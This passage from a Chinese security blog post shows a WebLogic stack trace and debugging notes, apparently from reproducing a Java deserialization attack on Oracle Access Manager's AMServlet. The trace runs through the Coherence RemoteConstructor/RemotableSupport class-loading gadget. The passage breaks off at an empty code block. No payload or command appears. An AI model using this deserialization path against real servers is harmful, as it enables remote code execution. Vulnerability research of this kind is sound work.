</span></span><span style=display:flex><span>findClass:<span style=color:#ae81ff>990</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFindClass:<span style=color:#ae81ff>611</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>543</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>496</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>473</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doParentDelegate:<span style=color:#ae81ff>584</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>526</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>496</span><span style=color:#f92672>,</span> GenericClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>71</span><span style=color:#f92672>,</span> ChangeAwareClassLoader <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>utils</span><span style=color:#f92672>.</span><span style=color:#a6e22e>classloaders</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>405</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>loadClass:<span style=color:#ae81ff>351</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>【此处以上的部分通过调试才能看到，错误日志的报错只到</span>native<span style=color:#960050;background-color:#1e0010>函数的调用为止】</span>
</span></span><span style=display:flex><span>defineClass1:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>defineClass:<span style=color:#ae81ff>756</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>defineClass:<span style=color:#ae81ff>635</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>★</span>defineClass<span style=color:#f92672>:</span><span style=color:#ae81ff>181</span><span style=color:#f92672>,</span> RemotableSupport <span style=color:#f92672>(</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>realize:<span style=color:#ae81ff>137</span><span style=color:#f92672>,</span> RemotableSupport <span style=color:#f92672>(</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>newInstance:<span style=color:#ae81ff>122</span><span style=color:#f92672>,</span> RemoteConstructor <span style=color:#f92672>(</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readResolve:<span style=color:#ae81ff>233</span><span style=color:#f92672>,</span> RemoteConstructor <span style=color:#f92672>(</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invoke0:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span> NativeMethodAccessorImpl <span style=color:#f92672>(</span>sun<span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invoke:<span style=color:#ae81ff>62</span><span style=color:#f92672>,</span> NativeMethodAccessorImpl <span style=color:#f92672>(</span>sun<span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invoke:<span style=color:#ae81ff>43</span><span style=color:#f92672>,</span> DelegatingMethodAccessorImpl <span style=color:#f92672>(</span>sun<span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invoke:<span style=color:#ae81ff>498</span><span style=color:#f92672>,</span> Method <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invokeReadResolve:<span style=color:#ae81ff>1275</span><span style=color:#f92672>,</span> ObjectStreamClass <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readOrdinaryObject:<span style=color:#ae81ff>2194</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject0:<span style=color:#ae81ff>1665</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject:<span style=color:#ae81ff>501</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject:<span style=color:#ae81ff>459</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readExternal:<span style=color:#ae81ff>56</span><span style=color:#f92672>,</span> BasicServiceContext <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>provider</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readExternalData:<span style=color:#ae81ff>2234</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readOrdinaryObject:<span style=color:#ae81ff>2183</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject0:<span style=color:#ae81ff>1665</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject:<span style=color:#ae81ff>501</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject:<span style=color:#ae81ff>459</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>unmarshal:<span style=color:#ae81ff>2453</span><span style=color:#f92672>,</span> OpenssoEngineController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>proxy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>opensso</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>processEvent:<span style=color:#ae81ff>1069</span><span style=color:#f92672>,</span> OpenssoEngineController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>proxy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>opensso</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>processEvent:<span style=color:#ae81ff>596</span><span style=color:#f92672>,</span> MasterController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>processRequest:<span style=color:#ae81ff>788</span><span style=color:#f92672>,</span> MasterController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>process:<span style=color:#ae81ff>708</span><span style=color:#f92672>,</span> MasterController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>delegateToMasterController:<span style=color:#ae81ff>221</span><span style=color:#f92672>,</span> PBLFlowManager <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>handleBaseEvent:<span style=color:#ae81ff>147</span><span style=color:#f92672>,</span> PBLFlowManager <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>processRequest:<span style=color:#ae81ff>107</span><span style=color:#f92672>,</span> PBLFlowManager <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>handleRequest:<span style=color:#ae81ff>221</span><span style=color:#f92672>,</span> AMServlet <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transport</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doPost:<span style=color:#ae81ff>177</span><span style=color:#f92672>,</span> AMServlet <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transport</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>service:<span style=color:#ae81ff>707</span><span style=color:#f92672>,</span> HttpServlet <span style=color:#f92672>(</span>javax<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>service:<span style=color:#ae81ff>790</span><span style=color:#f92672>,</span> HttpServlet <span style=color:#f92672>(</span>javax<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>295</span><span style=color:#f92672>,</span> StubSecurityHelper$ServletServiceAction <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>260</span><span style=color:#f92672>,</span> StubSecurityHelper$ServletServiceAction <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invokeServlet:<span style=color:#ae81ff>137</span><span style=color:#f92672>,</span> StubSecurityHelper <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>execute:<span style=color:#ae81ff>353</span><span style=color:#f92672>,</span> ServletStubImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>25</span><span style=color:#f92672>,</span> TailFilter <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>78</span><span style=color:#f92672>,</span> FilterChainImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>175</span><span style=color:#f92672>,</span> JpsAbsFilter$3 <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doPrivileged:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span> AccessController <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doAsPrivileged:<span style=color:#ae81ff>315</span><span style=color:#f92672>,</span> JpsSubject <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runJaasMode:<span style=color:#ae81ff>650</span><span style=color:#f92672>,</span> JpsPlatformUtil <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runJaasMode:<span style=color:#ae81ff>112</span><span style=color:#f92672>,</span> JpsAbsFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilterInternal:<span style=color:#ae81ff>293</span><span style=color:#f92672>,</span> JpsAbsFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>150</span><span style=color:#f92672>,</span> JpsAbsFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>94</span><span style=color:#f92672>,</span> JpsFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>78</span><span style=color:#f92672>,</span> FilterChainImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>248</span><span style=color:#f92672>,</span> DMSServletFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>dms</span><span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>78</span><span style=color:#f92672>,</span> FilterChainImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>92</span><span style=color:#f92672>,</span> ExtensibleGlobalFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>jrf</span><span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>78</span><span style=color:#f92672>,</span> FilterChainImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>wrapRun:<span style=color:#ae81ff>3797</span><span style=color:#f92672>,</span> WebAppServletContext$ServletInvocationAction <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>3763</span><span style=color:#f92672>,</span> WebAppServletContext$ServletInvocationAction <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doAs:<span style=color:#ae81ff>344</span><span style=color:#f92672>,</span> AuthenticatedSubject <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>acl</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runAsForUserCode:<span style=color:#ae81ff>197</span><span style=color:#f92672>,</span> SecurityManager <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>service</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runAsForUserCode:<span style=color:#ae81ff>203</span><span style=color:#f92672>,</span> WlsSecurityProvider <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>provider</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>71</span><span style=color:#f92672>,</span> WlsSubjectHandle <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>provider</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doSecuredExecute:<span style=color:#ae81ff>2451</span><span style=color:#f92672>,</span> WebAppServletContext <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>securedExecute:<span style=color:#ae81ff>2299</span><span style=color:#f92672>,</span> WebAppServletContext <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>execute:<span style=color:#ae81ff>2277</span><span style=color:#f92672>,</span> WebAppServletContext <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runInternal:<span style=color:#ae81ff>1720</span><span style=color:#f92672>,</span> ServletRequestImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>1680</span><span style=color:#f92672>,</span> ServletRequestImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>272</span><span style=color:#f92672>,</span> ContainerSupportProviderImpl$WlsRequestExecutor <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>provider</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>_runAs:<span style=color:#ae81ff>352</span><span style=color:#f92672>,</span> ComponentInvocationContextManager <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>invocation</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runAs:<span style=color:#ae81ff>337</span><span style=color:#f92672>,</span> ComponentInvocationContextManager <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>invocation</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doRunWorkUnderContext:<span style=color:#ae81ff>57</span><span style=color:#f92672>,</span> LivePartitionUtility <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runWorkUnderContext:<span style=color:#ae81ff>41</span><span style=color:#f92672>,</span> PartitionUtility <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runWorkUnderContext:<span style=color:#ae81ff>655</span><span style=color:#f92672>,</span> SelfTuningWorkManagerImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>execute:<span style=color:#ae81ff>420</span><span style=color:#f92672>,</span> ExecuteThread <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>360</span><span style=color:#f92672>,</span> ExecuteThread <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><p>到这里百思不得其解，一遍遍反复调试都是一样的结果。为什么几乎一样的运行时，移植之后就找不到这个类了呢？</p><h4 id=错误出在defineclass>错误出在defineclass<a hidden class=anchor aria-hidden=true href=#错误出在defineclass>#</a></h4><p>错误堆栈：</p><p><img loading=lazy src=image-20220326165348118.png alt=image-20220326165348118></p><p>几次F9之后在调试器中完全复刻了日志中的错误堆栈</p><p><img loading=lazy src=image-20220325112952977.png alt=image-20220325112952977></p><p>可以看到整个反序列化过程，从 <code>oracle.security.am.pbl.transport.http.AMServlet.doPost</code> 到 异常抛出，经过几个反序列化点</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-8> 8</a>
